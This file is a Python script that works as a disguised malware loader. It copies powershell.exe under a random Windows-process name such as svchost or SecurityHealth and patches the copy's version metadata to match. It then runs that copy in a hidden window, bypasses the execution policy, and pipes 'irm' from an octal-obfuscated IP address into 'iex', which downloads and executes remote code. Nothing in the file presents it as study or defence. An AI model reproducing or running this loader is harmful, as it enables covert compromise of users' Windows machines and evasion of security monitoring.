import os
import sys
import shutil
import struct
import subprocess
import threading
import tempfile
import random
import string

def read_stream(stream, prefix):
    for line in iter(stream.readline, ''):
        print(f"{prefix}{line.rstrip()}")
    stream.close()

def patch_version_field(data, field_name, new_value):
    """Patch a VERSION_INFO string field in PE binary data."""
    marker = field_name.encode('utf-16-le')
    pos = data.find(marker)
    if pos < 0:
        return data
    key_end = pos + len(marker) + 2
    while key_end % 4 != 0:
        key_end += 1
    value_start = key_end
    value_end = value_start
    while value_end < len(data) - 1:
        ch = struct.unpack_from('<H', data, value_end)[0]
        if ch == 0:
            break
        value_end += 2

    orig_len = (value_end - value_start) // 2
    if len(new_value) > orig_len:
        new_value = new_value[:orig_len]

    new_bytes = new_value.encode('utf-16-le')
    padded = new_bytes + b'\x00' * (orig_len * 2 - len(new_bytes))

    data = data[:value_start] + padded + data[value_end:]
    return data

def get_powershell_copy():
    """Copy powershell.exe with a new name and patch its metadata."""
    cache_dir = os.path.join(os.environ.get('LOCALAPPDATA', tempfile.gettempdir()), 'Microsoft', 'WindowsApps')
    if not os.path.isdir(cache_dir):
        cache_dir = os.path.join(os.environ.get('LOCALAPPDATA', tempfile.gettempdir()), 'Temp')
    if not os.path.isdir(cache_dir):
        try:
            os.makedirs(cache_dir, exist_ok=True)
        except:
            cache_dir = tempfile.gettempdir()
    sys_names = ['svchost', 'RuntimeBroker', 'SearchHost', 'SecurityHealth', 'WmiProvider',
                 'TaskScheduler', 'AppResolver', 'SettingsSync', 'DeviceSetup', 'UpdateAgent']
    base_name = random.choice(sys_names) + '.exe'
    dest_path = os.path.join(cache_dir, base_name)
    if os.path.isfile(dest_path) and os.path.getsize(dest_path) > 100000:
        return dest_path
    windir = os.environ.get('SystemRoot', r'C:\Windows')
    ps_paths = [
        os.path.join(windir, 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe'),
        os.path.join(windir, 'SysWOW64', 'WindowsPowerShell', 'v1.0', 'powershell.exe'),
    ]
    source = None
    for p in ps_paths:
        if os.path.isfile(p):
            source = p
            break
    if not source:
        return None
    try:
        shutil.copy2(source, dest_path)
    except:
        return None
    try:
        with open(dest_path, 'rb') as f:
            data = bytearray(f.read())

        name_no_ext = os.path.splitext(base_name)[0]
        data = bytearray(patch_version_field(bytes(data), 'OriginalFilename', base_name))
        data = bytearray(patch_version_field(bytes(data), 'InternalName', name_no_ext))
        data = bytearray(patch_version_field(bytes(data), 'FileDescription', name_no_ext))

        with open(dest_path, 'wb') as f:
            f.write(data)
    except:
        pass

    return dest_path


filePath = "C:\\\\MinGW\\\\bin\\\\pcagentactivationruntimestarter.exe"

if not filePath or not os.path.isfile(filePath):
    filePath = get_powershell_copy()

if not filePath or not os.path.isfile(filePath):
    filePath = "powershell.exe" 

process = subprocess.Popen(
    [filePath, "-NoProfile", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    creationflags=subprocess.CREATE_NO_WINDOW
)

t1 = threading.Thread(target=read_stream, args=(process.stdout, ""))
t2 = threading.Thread(target=read_stream, args=(process.stderr, "ERR: "))
t1.daemon = True
t2.daemon = True
t1.start()
t2.start()

with process.stdin as stdin:
    stdin.write("Set-ExecutionPolicy -Scope CurrentUser Bypass -Force\n")
    stdin.write("irm 0131.0247.0120.0152/init|iex\n")

process.wait()
sys.exit(process.returncode)
